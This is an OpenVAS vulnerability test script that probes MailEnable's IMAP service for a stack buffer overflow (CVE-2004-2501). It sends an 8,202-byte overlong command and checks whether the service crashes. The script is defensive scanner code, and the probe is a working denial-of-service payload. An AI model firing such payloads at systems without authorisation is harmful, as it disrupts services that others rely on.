# OpenVAS Vulnerability Test
# $Id: mailenable_imap_overflows.nasl 13409 2019-02-01 13:13:33Z cfischer $
# Description: MailEnable IMAP Service Remote Buffer Overflows
#
# Authors:
# George A. Theall, <theall@tifaware.com>
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.15852");
  script_version("$Revision: 13409 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-01 14:13:33 +0100 (Fri, 01 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2004-2501");
  script_bugtraq_id(11755);
  script_name("MailEnable IMAP Service Remote Buffer Overflows");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2004 George A. Theall");
  script_family("Denial of Service");
  script_dependencies("imap4_banner.nasl");
  script_require_ports("Services/imap", 143);
  script_mandatory_keys("imap/banner/available");

  script_xref(name:"URL", value:"http://www.mailenable.com/hotfix/default.asp");
  script_xref(name:"URL", value:"http://www.hat-squad.com/en/000102.html");

  script_tag(name:"solution", value:"Apply the IMAP hotfix dated 25 November 2004 and found at the references.");

  script_tag(name:"summary", value:"The target is running at least one vulnerable instance of MailEnable's IMAP
  service.");

  script_tag(name:"insight", value:"Two flaws exist in MailEnable Professional Edition 1.52 and
  earlier as well as MailEnable Enterprise Edition 1.01 and earlier - a
  stack-based buffer overflow and an object pointer overwrite.");

  script_tag(name:"impact", value:"A remote attacker can use either vulnerability to execute arbitrary code on the target.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("imap_func.inc");

port = get_imap_port(default:143);

# NB: MailEnable doesn't truly identify itself in the banner so we just
#     blindly login and do a search to try to bring down the service
#     if it looks like it's MailEnable.
banner = get_imap_banner(port:port);
if(!banner || "IMAP4rev1 server ready at" >!< banner)
  exit(0);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

s = recv_line(socket:soc, length:1024);
s = chomp(s);
if(!s || "IMAP4rev1 server ready at" >!< s) {
  close(soc);
  exit(0);
}

# Send a long command and see if the service crashes.
#
# nb: this tests only for the stack-based buffer overflow; the object
#     pointer overwrite vulnerability reportedly occurs in the same
#     versions so we just assume it's present if the former is.
c = string("a1 ", crap(8202));
send(socket:soc, data:string(c, "\r\n"));
while(s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:"^a1 (OK|BAD|NO)", string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
  resp = '';
}

# If we don't get a response, make sure the service is truly down.
if(!resp) {
  close(soc);
  soc = open_sock_tcp(port);
  if(!soc) {
    security_message(port:port);
    exit(0);
  }
}

# Logout.
c = string("a2", " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:"^a2 (OK|BAD|NO)", string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}

close(soc);
exit(99);